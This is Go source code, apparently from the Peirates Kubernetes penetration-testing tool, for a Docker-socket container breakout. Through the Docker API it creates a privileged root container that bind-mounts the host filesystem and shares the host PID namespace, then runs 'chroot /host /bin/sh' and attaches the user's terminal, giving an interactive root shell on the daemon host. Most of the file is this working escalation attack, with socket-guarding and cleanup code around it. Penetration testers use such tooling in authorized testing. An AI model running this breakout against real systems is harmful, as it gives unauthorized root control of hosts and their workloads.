//go:build linux

package dockersocket

import (
	"bufio"
	"bytes"
	"context"
	"crypto/rand"
	"encoding/binary"
	"encoding/hex"
	"encoding/json"
	"errors"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"os/signal"
	"path/filepath"
	"regexp"
	"sort"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unicode"

	"golang.org/x/sys/unix"
)

const (
	ownershipLabel       = "com.inguardians.peirates.docker-socket-breakout"
	minimumAPIVersion    = "1.25"
	maximumPingBody      = 64
	maximumJSONBody      = 1 << 20
	maximumErrorBody     = 64 << 10
	breakoutContainerTag = "shell"
	probeContainerTag    = "image-probe"
)

var (
	runIDPattern     = regexp.MustCompile(`^[a-f0-9]{24,64}$`)
	containerIDRegex = regexp.MustCompile(`^[a-f0-9]{12,64}$`)
)

type normalizedOptions struct {
	Options
	runID string
}

type socketIdentity struct {
	device uint64
	inode  uint64
}

type socketGuard struct {
	directoryFD  int
	baseName     string
	dialPath     string
	originalPath string
	identity     socketIdentity
}

type dockerClient struct {
	guard      *socketGuard
	httpClient *http.Client
	transport  *http.Transport
	timeout    time.Duration
	apiVersion string
}

type versionResponse struct {
	APIVersion      string `json:"ApiVersion"`
	MinAPIVersion   string `json:"MinAPIVersion"`
	Version         string `json:"Version"`
	OperatingSystem string `json:"Os"`
	Architecture    string `json:"Arch"`
}

type imageInspectResponse struct {
	ID string `json:"Id"`
}

type imageSummary struct {
	RepoTags []string `json:"RepoTags"`
}

type hostConfig struct {
	Privileged      bool     `json:"Privileged,omitempty"`
	Binds           []string `json:"Binds,omitempty"`
	PIDMode         string   `json:"PidMode,omitempty"`
	ReadonlyRootfs  bool     `json:"ReadonlyRootfs,omitempty"`
	CapDrop         []string `json:"CapDrop,omitempty"`
	SecurityOptions []string `json:"SecurityOpt,omitempty"`
}

type createContainerRequest struct {
	Image           string            `json:"Image"`
	User            string            `json:"User,omitempty"`
	Environment     []string          `json:"Env,omitempty"`
	Entrypoint      []string          `json:"Entrypoint"`
	Command         []string          `json:"Cmd"`
	AttachStdin     bool              `json:"AttachStdin,omitempty"`
	AttachStdout    bool              `json:"AttachStdout,omitempty"`
	AttachStderr    bool              `json:"AttachStderr,omitempty"`
	OpenStdin       bool              `json:"OpenStdin,omitempty"`
	StdinOnce       bool              `json:"StdinOnce,omitempty"`
	TTY             bool              `json:"Tty,omitempty"`
	NetworkDisabled bool              `json:"NetworkDisabled,omitempty"`
	Labels          map[string]string `json:"Labels"`
	HostConfig      hostConfig        `json:"HostConfig"`
}

type createContainerResponse struct {
	ID string `json:"Id"`
}

type waitContainerResponse struct {
	StatusCode int64 `json:"StatusCode"`
	Error      *struct {
		Message string `json:"Message"`
	} `json:"Error,omitempty"`
}

type inspectContainerResponse struct {
	ID     string `json:"Id"`
	Config struct {
		Labels map[string]string `json:"Labels"`
	} `json:"Config"`
}

type ownedContainer struct {
	id    string
	token string
}

type attachedConnection struct {
	connection net.Conn
	reader     *bufio.Reader
}

type terminalController interface {
	isTerminal(io.Reader) bool
	makeRaw(io.Reader) (func() error, error)
	size(io.Reader) (height, width uint, ok bool)
}

type linuxTerminal struct{}

func probe(ctx context.Context, options Options) (Finding, error) {
	normalized, err := normalizeOptions(options, false)
	if err != nil {
		return Finding{}, err
	}
	client, err := newDockerClient(normalized)
	if err != nil {
		return Finding{}, err
	}
	defer client.close()
	return client.probe(ctx, normalized.Image)
}

func launch(ctx context.Context, options Options) error {
	normalized, err := normalizeOptions(options, true)
	if err != nil {
		return err
	}
	client, err := newDockerClient(normalized)
	if err != nil {
		return err
	}
	defer client.close()
	return launchWithClient(ctx, normalized, client, linuxTerminal{})
}

func launchWithClient(parent context.Context, options normalizedOptions, client *dockerClient, terminal terminalController) (returnErr error) {
	ctx, stopSignals := signal.NotifyContext(parent, os.Interrupt, syscall.SIGTERM, syscall.SIGHUP)
	defer stopSignals()

	finding, err := client.probe(ctx, options.Image)
	if err != nil {
		return err
	}
	fmt.Fprintf(options.Stderr, "[docker-socket-breakout] Docker %s API %s on %s/%s; the target is the daemon host, which may be nested or remote.\n",
		finding.ServerVersion, finding.APIVersion, finding.OperatingSystem, finding.Architecture)

	if err := client.verifyImageTools(ctx, options, options.runID+"-"+probeContainerTag); err != nil {
		return err
	}
	fmt.Fprintf(options.Stderr, "[docker-socket-breakout] Creating a privileged container from %s...\n", options.Image)

	tty := terminal.isTerminal(options.Stdin)
	shellCommand := "exec chroot /host /bin/sh"
	if tty {
		shellCommand += " -i"
	}
	request := createContainerRequest{
		Image:        options.Image,
		User:         "0:0",
		Environment:  dockerShellEnvironment(tty),
		Entrypoint:   []string{"/bin/sh", "-c"},
		Command:      []string{shellCommand},
		AttachStdin:  true,
		AttachStdout: true,
		AttachStderr: true,
		OpenStdin:    true,
		StdinOnce:    true,
		TTY:          tty,
		Labels:       map[string]string{ownershipLabel: options.runID + "-" + breakoutContainerTag},
		HostConfig: hostConfig{
			Privileged: true,
			Binds:      []string{"/:/host:rw"},
			PIDMode:    "host",
		},
	}
	owned, err := client.createContainer(ctx, "peirates-breakout-"+options.runID, request, options.runID+"-"+breakoutContainerTag)
	if err != nil {
		return err
	}
	defer func() {
		returnErr = errors.Join(returnErr, client.removeOwned(context.WithoutCancel(parent), owned))
	}()

	attached, err := client.attach(ctx, owned.id, options.AttachTimeout)
	if err != nil {
		return err
	}
	defer attached.connection.Close()

	restore := func() error { return nil }
	if tty {
		restore, err = terminal.makeRaw(options.Stdin)
		if err != nil {
			return fmt.Errorf("prepare terminal: %w", err)
		}
	}
	restored := false
	restoreTerminal := func() error {
		if restored {
			return nil
		}
		restored = true
		if err := restore(); err != nil {
			return fmt.Errorf("restore terminal: %w", err)
		}
		return nil
	}
	defer func() { returnErr = errors.Join(returnErr, restoreTerminal()) }()

	if err := client.startContainer(ctx, owned.id); err != nil {
		return err
	}
	fmt.Fprintln(options.Stdout, "Entering the Docker daemon host filesystem; exit returns to Peirates.")

	stopResize := func() {}
	if tty {
		stopResize = client.monitorResize(ctx, owned.id, options.Stdin, terminal)
	}
	streamErr := relayTTY(ctx, attached, options.Stdin, options.Stdout, options.Stderr, tty)
	stopResize()
	if restoreErr := restoreTerminal(); restoreErr != nil {
		streamErr = errors.Join(streamErr, restoreErr)
	}
	if streamErr != nil {
		return streamErr
	}
	status, err := client.waitContainer(ctx, owned.id)
	if err != nil {
		return err
	}
	if status != 0 {
		return fmt.Errorf("host shell exited with status %d", status)
	}
	return nil
}

func dockerShellEnvironment(tty bool) []string {
	if !tty {
		return []string{"TERM=dumb"}
	}
	term := os.Getenv("TERM")
	if term == "" || strings.ContainsAny(term, "\x00\r\n") {
		return nil
	}
	return []string{"TERM=" + term}
}

func normalizeOptions(options Options, imageRequired bool) (normalizedOptions, error) {
	if options.SocketPath == "" {
		return normalizedOptions{}, fmt.Errorf("Docker socket path is required")
	}
	if !filepath.IsAbs(options.SocketPath) {
		return normalizedOptions{}, fmt.Errorf("Docker socket path must be absolute")
	}
	if filepath.Clean(options.SocketPath) != options.SocketPath {
		return normalizedOptions{}, fmt.Errorf("Docker socket path must be clean and unambiguous")
	}
	if imageRequired && strings.TrimSpace(options.Image) == "" {
		return normalizedOptions{}, fmt.Errorf("an already-present Docker image is required")
	}
	if strings.ContainsAny(options.Image, "\x00\r\n") {
		return normalizedOptions{}, fmt.Errorf("Docker image name contains invalid characters")
	}
	if options.RequestTimeout < 0 || options.AttachTimeout < 0 {
		return normalizedOptions{}, fmt.Errorf("Docker timeouts cannot be negative")
	}
	if options.RequestTimeout == 0 {
		options.RequestTimeout = defaultRequestTimeout
	}
	if options.AttachTimeout == 0 {
		options.AttachTimeout = defaultAttachTimeout
	}
	if options.Stdin == nil {
		options.Stdin = strings.NewReader("")
	}
	if options.Stdout == nil {
		options.Stdout = io.Discard
	}
	if options.Stderr == nil {
		options.Stderr = io.Discard
	}
	runID := options.RunID
	if runID == "" {
		buffer := make([]byte, 12)
		if _, err := rand.Read(buffer); err != nil {
			return normalizedOptions{}, fmt.Errorf("generate ownership identifier: %w", err)
		}
		runID = hex.EncodeToString(buffer)
	}
	if !runIDPattern.MatchString(runID) {
		return normalizedOptions{}, fmt.Errorf("run ID must contain 24-64 lowercase hexadecimal characters")
	}
	return normalizedOptions{Options: options, runID: runID}, nil
}

func newDockerClient(options normalizedOptions) (*dockerClient, error) {
	guard, err := openSocketGuard(options.SocketPath)
	if err != nil {
		return nil, err
	}
	transport := &http.Transport{
		Proxy:               nil,
		DisableCompression:  true,
		MaxIdleConns:        2,
		MaxIdleConnsPerHost: 2,
		DialContext:         guard.dialContext,
	}
	return &dockerClient{
		guard: guard, transport: transport,
		httpClient: &http.Client{Transport: transport},
		timeout:    options.RequestTimeout,
	}, nil
}

func (client *dockerClient) close() {
	client.transport.CloseIdleConnections()
	_ = client.guard.close()
}

func (client *dockerClient) probe(ctx context.Context, image string) (Finding, error) {
	pong, err := client.request(ctx, http.MethodGet, "/_ping", nil, maximumPingBody, http.StatusOK)
	if err != nil {
		return Finding{}, fmt.Errorf("ping Docker daemon: %w", err)
	}
	if strings.TrimSpace(string(pong)) != "OK" {
		return Finding{}, fmt.Errorf("Docker daemon returned an unexpected ping response")
	}

	versionBody, err := client.request(ctx, http.MethodGet, "/version", nil, maximumJSONBody, http.StatusOK)
	if err != nil {
		return Finding{}, fmt.Errorf("read Docker daemon version: %w", err)
	}
	var version versionResponse
	if err := json.Unmarshal(versionBody, &version); err != nil {
		return Finding{}, fmt.Errorf("decode Docker daemon version: %w", err)
	}
	if err := validateAPIVersion(version.APIVersion, version.MinAPIVersion); err != nil {
		return Finding{}, err
	}
	client.apiVersion = version.APIVersion

	finding := Finding{
		SocketPath: client.guard.originalPath, APIVersion: version.APIVersion,
		ServerVersion: version.Version, OperatingSystem: version.OperatingSystem,
		Architecture: version.Architecture, Image: image,
		Caveat: "the Docker daemon host may be a nested or remote environment rather than the Kubernetes node",
	}
	if image == "" {
		imagesBody, err := client.request(ctx, http.MethodGet, client.versioned("/images/json?all=0"), nil, maximumJSONBody, http.StatusOK)
		if err != nil {
			return Finding{}, fmt.Errorf("list tagged local Docker images: %w", err)
		}
		var images []imageSummary
		if err := json.Unmarshal(imagesBody, &images); err != nil {
			return Finding{}, fmt.Errorf("decode local image list: %w", err)
		}
		seen := make(map[string]struct{})
		for _, summary := range images {
			for _, tag := range summary.RepoTags {
				if tag == "" || tag == "<none>:<none>" {
					continue
				}
				seen[tag] = struct{}{}
			}
		}
		for tag := range seen {
			finding.AvailableImages = append(finding.AvailableImages, tag)
		}
		sort.Strings(finding.AvailableImages)
		return finding, nil
	}

	imageBody, err := client.request(ctx, http.MethodGet, client.versioned("/images/"+url.PathEscape(image)+"/json"), nil, maximumJSONBody, http.StatusOK)
	if err != nil {
		return Finding{}, fmt.Errorf("inspect already-present image %q (no pull was attempted): %w", image, err)
	}
	var inspected imageInspectResponse
	if err := json.Unmarshal(imageBody, &inspected); err != nil {
		return Finding{}, fmt.Errorf("decode image inspection: %w", err)
	}
	if inspected.ID == "" {
		return Finding{}, fmt.Errorf("image inspection did not return an image ID")
	}
	finding.ImageID = inspected.ID
	return finding, nil
}

func validateAPIVersion(maximum, minimum string) error {
	maxMajor, maxMinor, err := parseVersion(maximum)
	if err != nil {
		return fmt.Errorf("invalid Docker API version %q", maximum)
	}
	if minimum != "" {
		if _, _, err := parseVersion(minimum); err != nil {
			return fmt.Errorf("invalid minimum Docker API version %q", minimum)
		}
	}
	requiredMajor, requiredMinor, _ := parseVersion(minimumAPIVersion)
	if maxMajor < requiredMajor || (maxMajor == requiredMajor && maxMinor < requiredMinor) {
		return fmt.Errorf("Docker API %s is older than required API %s", maximum, minimumAPIVersion)
	}
	return nil
}

func parseVersion(value string) (int, int, error) {
	parts := strings.Split(value, ".")
	if len(parts) != 2 {
		return 0, 0, errors.New("version must have two components")
	}
	major, err := strconv.Atoi(parts[0])
	if err != nil || major < 0 {
		return 0, 0, errors.New("invalid major version")
	}
	minor, err := strconv.Atoi(parts[1])
	if err != nil || minor < 0 {
		return 0, 0, errors.New("invalid minor version")
	}
	return major, minor, nil
}

func (client *dockerClient) versioned(path string) string {
	return "/v" + client.apiVersion + path
}

func (client *dockerClient) request(ctx context.Context, method, path string, requestBody any, limit int64, accepted ...int) ([]byte, error) {
	var body io.Reader
	if requestBody != nil {
		encoded, err := json.Marshal(requestBody)
		if err != nil {
			return nil, fmt.Errorf("encode request: %w", err)
		}
		body = bytes.NewReader(encoded)
	}
	requestContext, cancel := context.WithTimeout(ctx, client.timeout)
	defer cancel()
	request, err := http.NewRequestWithContext(requestContext, method, "http://docker"+path, body)
	if err != nil {
		return nil, fmt.Errorf("build request: %w", err)
	}
	request.Header.Set("Accept", "application/json")
	if requestBody != nil {
		request.Header.Set("Content-Type", "application/json")
	}
	response, err := client.httpClient.Do(request)
	if err != nil {
		return nil, err
	}
	defer response.Body.Close()
	readLimit := limit
	if readLimit < maximumErrorBody {
		readLimit = maximumErrorBody
	}
	responseBody, err := readBounded(response.Body, readLimit)
	if err != nil {
		return nil, err
	}
	acceptedStatus := false
	for _, status := range accepted {
		if response.StatusCode == status {
			acceptedStatus = true
			break
		}
	}
	if !acceptedStatus {
		return nil, fmt.Errorf("Docker API %s %s returned %s: %s", method, path, response.Status, safeErrorText(responseBody))
	}
	if int64(len(responseBody)) > limit {
		return nil, fmt.Errorf("Docker API response exceeds %d bytes", limit)
	}
	return responseBody, nil
}

func readBounded(reader io.Reader, limit int64) ([]byte, error) {
	data, err := io.ReadAll(io.LimitReader(reader, limit+1))
	if err != nil {
		return nil, fmt.Errorf("read Docker API response: %w", err)
	}
	if int64(len(data)) > limit {
		return nil, fmt.Errorf("Docker API response exceeds %d bytes", limit)
	}
	return data, nil
}

func safeErrorText(body []byte) string {
	value := strings.Map(func(character rune) rune {
		if unicode.IsPrint(character) && character != '\r' && character != '\n' {
			return character
		}
		return ' '
	}, string(body))
	value = strings.TrimSpace(value)
	if value == "" {
		return "no response body"
	}
	return value
}

func (client *dockerClient) verifyImageTools(ctx context.Context, options normalizedOptions, token string) (returnErr error) {
	request := createContainerRequest{
		Image:           options.Image,
		User:            "0:0",
		Entrypoint:      []string{"/bin/sh", "-c"},
		Command:         []string{"command -v chroot >/dev/null 2>&1"},
		NetworkDisabled: true,
		Labels:          map[string]string{ownershipLabel: token},
		HostConfig: hostConfig{
			ReadonlyRootfs:  true,
			CapDrop:         []string{"ALL"},
			SecurityOptions: []string{"no-new-privileges"},
		},
	}
	owned, err := client.createContainer(ctx, "peirates-image-probe-"+options.runID, request, token)
	if err != nil {
		return fmt.Errorf("create constrained image probe: %w", err)
	}
	defer func() {
		returnErr = errors.Join(returnErr, client.removeOwned(context.WithoutCancel(ctx), owned))
	}()
	if err := client.startContainer(ctx, owned.id); err != nil {
		return fmt.Errorf("start constrained image probe: %w", err)
	}
	status, err := client.waitContainer(ctx, owned.id)
	if err != nil {
		return fmt.Errorf("wait for constrained image probe: %w", err)
	}
	if status != 0 {
		return fmt.Errorf("already-present image %q does not provide usable /bin/sh and chroot (probe exited %d)", options.Image, status)
	}
	return nil
}

func (client *dockerClient) createContainer(ctx context.Context, name string, request createContainerRequest, token string) (ownedContainer, error) {
	path := client.versioned("/containers/create?") + url.Values{"name": []string{name}}.Encode()
	body, err := client.request(ctx, http.MethodPost, path, request, maximumJSONBody, http.StatusCreated)
	if err != nil {
		return ownedContainer{}, client.cleanupAmbiguousCreation(ctx, name, token, err)
	}
	var created createContainerResponse
	if err := json.Unmarshal(body, &created); err != nil {
		creationErr := fmt.Errorf("decode container creation response: %w", err)
		return ownedContainer{}, client.cleanupAmbiguousCreation(ctx, name, token, creationErr)
	}
	if !containerIDRegex.MatchString(created.ID) {
		creationErr := fmt.Errorf("Docker daemon returned an invalid container ID")
		return ownedContainer{}, client.cleanupAmbiguousCreation(ctx, name, token, creationErr)
	}
	return ownedContainer{id: created.ID, token: token}, nil
}

func (client *dockerClient) cleanupAmbiguousCreation(ctx context.Context, name, token string, creationErr error) error {
	cleanupContext := context.WithoutCancel(ctx)
	body, inspectErr := client.request(cleanupContext, http.MethodGet,
		client.versioned("/containers/"+url.PathEscape(name)+"/json"), nil, maximumJSONBody, http.StatusOK)
	if inspectErr != nil {
		return errors.Join(creationErr, fmt.Errorf("cleanup after ambiguous creation of %s is unverified: %w", name, inspectErr))
	}
	var inspected inspectContainerResponse
	if err := json.Unmarshal(body, &inspected); err != nil {
		return errors.Join(creationErr, fmt.Errorf("cleanup after ambiguous creation of %s is unverified: %w", name, err))
	}
	if !containerIDRegex.MatchString(inspected.ID) {
		return errors.Join(creationErr, fmt.Errorf("cleanup after ambiguous creation of %s is unverified because inspection returned an invalid ID", name))
	}
	if inspected.Config.Labels[ownershipLabel] != token {
		return errors.Join(creationErr, fmt.Errorf("refusing cleanup after ambiguous creation of %s because its ownership label does not match", name))
	}
	return errors.Join(creationErr, client.removeOwned(cleanupContext, ownedContainer{id: inspected.ID, token: token}))
}

func (client *dockerClient) startContainer(ctx context.Context, id string) error {
	_, err := client.request(ctx, http.MethodPost, client.versioned("/containers/"+id+"/start"), nil, maximumJSONBody, http.StatusNoContent, http.StatusNotModified)
	return err
}

func (client *dockerClient) waitContainer(ctx context.Context, id string) (int64, error) {
	body, err := client.request(ctx, http.MethodPost, client.versioned("/containers/"+id+"/wait?condition=not-running"), nil, maximumJSONBody, http.StatusOK)
	if err != nil {
		return 0, err
	}
	var waited waitContainerResponse
	if err := json.Unmarshal(body, &waited); err != nil {
		return 0, fmt.Errorf("decode container wait response: %w", err)
	}
	if waited.Error != nil && waited.Error.Message != "" {
		return 0, fmt.Errorf("container wait failed: %s", safeErrorText([]byte(waited.Error.Message)))
	}
	return waited.StatusCode, nil
}

func (client *dockerClient) removeOwned(ctx context.Context, owned ownedContainer) error {
	if owned.id == "" {
		return nil
	}
	body, err := client.request(ctx, http.MethodGet, client.versioned("/containers/"+owned.id+"/json"), nil, maximumJSONBody, http.StatusOK)
	if err != nil {
		return fmt.Errorf("cleanup of container %s is unverified because ownership inspection failed: %w", owned.id, err)
	}
	var inspected inspectContainerResponse
	if err := json.Unmarshal(body, &inspected); err != nil {
		return fmt.Errorf("cleanup of container %s is unverified because ownership inspection was invalid: %w", owned.id, err)
	}
	if inspected.ID != owned.id {
		return fmt.Errorf("refusing to remove container %s because inspection returned a different container ID", owned.id)
	}
	if inspected.Config.Labels[ownershipLabel] != owned.token {
		return fmt.Errorf("refusing to remove container %s because its Peirates ownership label does not match", owned.id)
	}
	_, err = client.request(ctx, http.MethodDelete, client.versioned("/containers/"+owned.id+"?force=1&v=1"), nil, maximumJSONBody, http.StatusNoContent)
	if err != nil {
		return fmt.Errorf("remove owned container %s: %w", owned.id, err)
	}
	return nil
}

func (client *dockerClient) attach(ctx context.Context, id string, timeout time.Duration) (*attachedConnection, error) {
	attachContext, cancel := context.WithTimeout(ctx, timeout)
	defer cancel()
	connection, err := client.guard.dialContext(attachContext, "unix", "docker")
	if err != nil {
		return nil, fmt.Errorf("connect Docker attach stream: %w", err)
	}
	failed := true
	defer func() {
		if failed {
			_ = connection.Close()
		}
	}()
	if deadline, ok := attachContext.Deadline(); ok {
		if err := connection.SetDeadline(deadline); err != nil {
			return nil, fmt.Errorf("bound Docker attach handshake: %w", err)
		}
	}
	path := client.versioned("/containers/" + id + "/attach?stream=1&stdin=1&stdout=1&stderr=1")
	request, err := http.NewRequestWithContext(attachContext, http.MethodPost, "http://docker"+path, nil)
	if err != nil {
		return nil, fmt.Errorf("build Docker attach request: %w", err)
	}
	request.Header.Set("Connection", "Upgrade")
	request.Header.Set("Upgrade", "tcp")
	if err := request.Write(connection); err != nil {
		return nil, fmt.Errorf("write Docker attach request: %w", err)
	}
	reader := bufio.NewReader(connection)
	response, err := http.ReadResponse(reader, request)
	if err != nil {
		return nil, fmt.Errorf("read Docker attach response: %w", err)
	}
	if response.StatusCode != http.StatusSwitchingProtocols {
		responseBody, readErr := readBounded(response.Body, maximumErrorBody)
		_ = response.Body.Close()
		if readErr != nil {
			return nil, readErr
		}
		return nil, fmt.Errorf("Docker attach returned %s: %s", response.Status, safeErrorText(responseBody))
	}
	if err := connection.SetDeadline(time.Time{}); err != nil {
		return nil, fmt.Errorf("clear Docker attach deadline: %w", err)
	}
	failed = false
	return &attachedConnection{connection: connection, reader: reader}, nil
}

func relayTTY(ctx context.Context, attached *attachedConnection, stdin io.Reader, stdout, stderr io.Writer, tty bool) error {
	inputContext, cancelInput := context.WithCancel(ctx)
	defer cancelInput()
	outputDone := make(chan error, 1)
	go func() {
		outputDone <- copyDockerOutput(attached.reader, stdout, stderr, tty)
	}()
	go func() {
		_ = copyTTYInput(inputContext, attached.connection, stdin)
		if closeWriter, ok := attached.connection.(interface{ CloseWrite() error }); ok {
			_ = closeWriter.CloseWrite()
		}
	}()
	select {
	case err := <-outputDone:
		if err != nil && !errors.Is(err, net.ErrClosed) {
			return fmt.Errorf("read Docker TTY stream: %w", err)
		}
		return nil
	case <-ctx.Done():
		_ = attached.connection.Close()
		<-outputDone
		return fmt.Errorf("Docker TTY stream interrupted: %w", ctx.Err())
	}
}

func copyDockerOutput(input io.Reader, stdout, stderr io.Writer, tty bool) error {
	if tty {
		_, err := io.Copy(stdout, input)
		return err
	}
	var header [8]byte
	for {
		_, err := io.ReadFull(input, header[:])
		if errors.Is(err, io.EOF) {
			return nil
		}
		if err != nil {
			return fmt.Errorf("read Docker stream header: %w", err)
		}
		if header[0] != 1 && header[0] != 2 {
			return fmt.Errorf("Docker stream returned invalid channel %d", header[0])
		}
		if header[1] != 0 || header[2] != 0 || header[3] != 0 {
			return fmt.Errorf("Docker stream returned an invalid frame header")
		}
		length := int64(binary.BigEndian.Uint32(header[4:]))
		destination := stdout
		if header[0] == 2 {
			destination = stderr
		}
		if _, err := io.CopyN(destination, input, length); err != nil {
			return fmt.Errorf("read Docker stream frame: %w", err)
		}
	}
}

func copyTTYInput(ctx context.Context, destination io.Writer, input io.Reader) error {
	file, isFile := input.(*os.File)
	if !isFile {
		_, err := io.Copy(destination, input)
		return err
	}
	pollDescriptors := []unix.PollFd{{Fd: int32(file.Fd()), Events: unix.POLLIN | unix.POLLHUP}}
	buffer := make([]byte, 32<<10)
	for {
		if err := ctx.Err(); err != nil {
			return err
		}
		ready, err := unix.Poll(pollDescriptors, 100)
		if err != nil {
			if errors.Is(err, unix.EINTR) {
				continue
			}
			return err
		}
		if ready == 0 {
			continue
		}
		events := pollDescriptors[0].Revents
		if events&(unix.POLLERR|unix.POLLNVAL) != 0 {
			return fmt.Errorf("terminal input became unavailable")
		}
		if events&(unix.POLLIN|unix.POLLHUP) == 0 {
			continue
		}
		count, readErr := unix.Read(int(file.Fd()), buffer)
		if count > 0 {
			if _, err := destination.Write(buffer[:count]); err != nil {
				return err
			}
		}
		if readErr != nil {
			if errors.Is(readErr, unix.EINTR) || errors.Is(readErr, unix.EAGAIN) {
				continue
			}
			return readErr
		}
		if count == 0 {
			return nil
		}
	}
}

func (client *dockerClient) monitorResize(ctx context.Context, id string, input io.Reader, terminal terminalController) func() {
	resizeContext, cancel := context.WithCancel(ctx)
	resize := func() {
		height, width, ok := terminal.size(input)
		if !ok {
			return
		}
		path := client.versioned("/containers/"+id+"/resize?") + url.Values{
			"h": []string{strconv.FormatUint(uint64(height), 10)},
			"w": []string{strconv.FormatUint(uint64(width), 10)},
		}.Encode()
		_, _ = client.request(resizeContext, http.MethodPost, path, nil, maximumJSONBody, http.StatusOK, http.StatusNoContent)
	}
	resize()
	changes := make(chan os.Signal, 1)
	signal.Notify(changes, syscall.SIGWINCH)
	go func() {
		for {
			select {
			case <-resizeContext.Done():
				return
			case <-changes:
				resize()
			}
		}
	}()
	return func() {
		signal.Stop(changes)
		cancel()
	}
}

func (linuxTerminal) isTerminal(input io.Reader) bool {
	file, ok := input.(*os.File)
	if !ok {
		return false
	}
	_, err := unix.IoctlGetTermios(int(file.Fd()), unix.TCGETS)
	return err == nil
}

func (linuxTerminal) makeRaw(input io.Reader) (func() error, error) {
	file, ok := input.(*os.File)
	if !ok {
		return func() error { return nil }, nil
	}
	oldState, err := unix.IoctlGetTermios(int(file.Fd()), unix.TCGETS)
	if errors.Is(err, unix.ENOTTY) || errors.Is(err, unix.EINVAL) {
		return func() error { return nil }, nil
	}
	if err != nil {
		return nil, err
	}
	raw := *oldState
	raw.Iflag &^= unix.IGNBRK | unix.BRKINT | unix.PARMRK | unix.ISTRIP | unix.INLCR | unix.IGNCR | unix.ICRNL | unix.IXON
	raw.Oflag &^= unix.OPOST
	raw.Lflag &^= unix.ECHO | unix.ECHONL | unix.ICANON | unix.ISIG | unix.IEXTEN
	raw.Cflag &^= unix.CSIZE | unix.PARENB
	raw.Cflag |= unix.CS8
	raw.Cc[unix.VMIN] = 1
	raw.Cc[unix.VTIME] = 0
	if err := unix.IoctlSetTermios(int(file.Fd()), unix.TCSETS, &raw); err != nil {
		return nil, err
	}
	return func() error { return unix.IoctlSetTermios(int(file.Fd()), unix.TCSETS, oldState) }, nil
}

func (linuxTerminal) size(input io.Reader) (height, width uint, ok bool) {
	file, ok := input.(*os.File)
	if !ok {
		return 0, 0, false
	}
	size, err := unix.IoctlGetWinsize(int(file.Fd()), unix.TIOCGWINSZ)
	if err != nil || size.Row == 0 || size.Col == 0 {
		return 0, 0, false
	}
	return uint(size.Row), uint(size.Col), true
}

func openSocketGuard(socketPath string) (*socketGuard, error) {
	info, err := os.Lstat(socketPath)
	if err != nil {
		return nil, fmt.Errorf("inspect Docker socket: %w", err)
	}
	if info.Mode()&os.ModeSymlink != 0 {
		return nil, fmt.Errorf("Docker socket path must not be a symbolic link")
	}
	if info.Mode()&os.ModeSocket == 0 {
		return nil, fmt.Errorf("Docker socket path is not a Unix socket")
	}
	parent, base := filepath.Split(socketPath)
	base = strings.TrimSuffix(base, string(filepath.Separator))
	if base == "" || base == "." || base == ".." {
		return nil, fmt.Errorf("Docker socket path has an invalid final component")
	}
	resolvedParent, err := filepath.EvalSymlinks(filepath.Clean(parent))
	if err != nil {
		return nil, fmt.Errorf("resolve Docker socket parent directory: %w", err)
	}
	directoryFD, err := openDirectoryWithoutSymlinks(resolvedParent)
	if err != nil {
		return nil, fmt.Errorf("open Docker socket parent directory: %w", err)
	}
	guard := &socketGuard{directoryFD: directoryFD, baseName: base, originalPath: socketPath}
	guard.dialPath = "/proc/self/fd/" + strconv.Itoa(directoryFD) + "/" + base
	identity, err := guard.currentIdentity()
	if err != nil {
		_ = guard.close()
		return nil, err
	}
	guard.identity = identity
	return guard, nil
}

func openDirectoryWithoutSymlinks(path string) (int, error) {
	if !filepath.IsAbs(path) {
		return -1, fmt.Errorf("directory path is not absolute")
	}
	current, err := unix.Open("/", unix.O_PATH|unix.O_DIRECTORY|unix.O_CLOEXEC, 0)
	if err != nil {
		return -1, err
	}
	components := strings.Split(strings.TrimPrefix(filepath.Clean(path), "/"), "/")
	if len(components) == 1 && components[0] == "." {
		return current, nil
	}
	for _, component := range components {
		if component == "" || component == "." || component == ".." {
			_ = unix.Close(current)
			return -1, fmt.Errorf("invalid path component")
		}
		next, openErr := unix.Openat(current, component, unix.O_PATH|unix.O_DIRECTORY|unix.O_NOFOLLOW|unix.O_CLOEXEC, 0)
		_ = unix.Close(current)
		if openErr != nil {
			return -1, openErr
		}
		current = next
	}
	return current, nil
}

func (guard *socketGuard) currentIdentity() (socketIdentity, error) {
	var stat unix.Stat_t
	if err := unix.Fstatat(guard.directoryFD, guard.baseName, &stat, unix.AT_SYMLINK_NOFOLLOW); err != nil {
		return socketIdentity{}, fmt.Errorf("inspect Docker socket from guarded directory: %w", err)
	}
	if stat.Mode&unix.S_IFMT != unix.S_IFSOCK {
		return socketIdentity{}, fmt.Errorf("Docker socket path is not a Unix socket")
	}
	return socketIdentity{device: uint64(stat.Dev), inode: stat.Ino}, nil
}

func (guard *socketGuard) dialContext(ctx context.Context, _, _ string) (net.Conn, error) {
	before, err := guard.currentIdentity()
	if err != nil {
		return nil, err
	}
	if before != guard.identity {
		return nil, fmt.Errorf("Docker socket identity changed before connection")
	}
	connection, err := (&net.Dialer{}).DialContext(ctx, "unix", guard.dialPath)
	if err != nil {
		return nil, err
	}
	after, err := guard.currentIdentity()
	if err != nil {
		_ = connection.Close()
		return nil, err
	}
	if after != guard.identity {
		_ = connection.Close()
		return nil, fmt.Errorf("Docker socket identity changed during connection")
	}
	return connection, nil
}

func (guard *socketGuard) close() error {
	if guard.directoryFD < 0 {
		return nil
	}
	err := unix.Close(guard.directoryFD)
	guard.directoryFD = -1
	return err
}
